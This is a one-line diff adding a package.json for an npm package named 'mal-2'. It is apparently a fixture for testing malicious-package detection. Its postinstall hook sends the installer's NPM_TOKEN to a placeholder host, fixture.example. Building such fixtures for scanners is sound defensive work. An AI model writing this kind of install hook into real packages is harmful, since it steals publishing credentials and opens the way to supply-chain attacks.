@@ -1,0 +1,1 @@
+{"name":"mal-2","version":"2.1.1","scripts":{"postinstall":"node -e \"require('https').get('http://fixture.example/?t='+process.env.NPM_TOKEN)\""}}
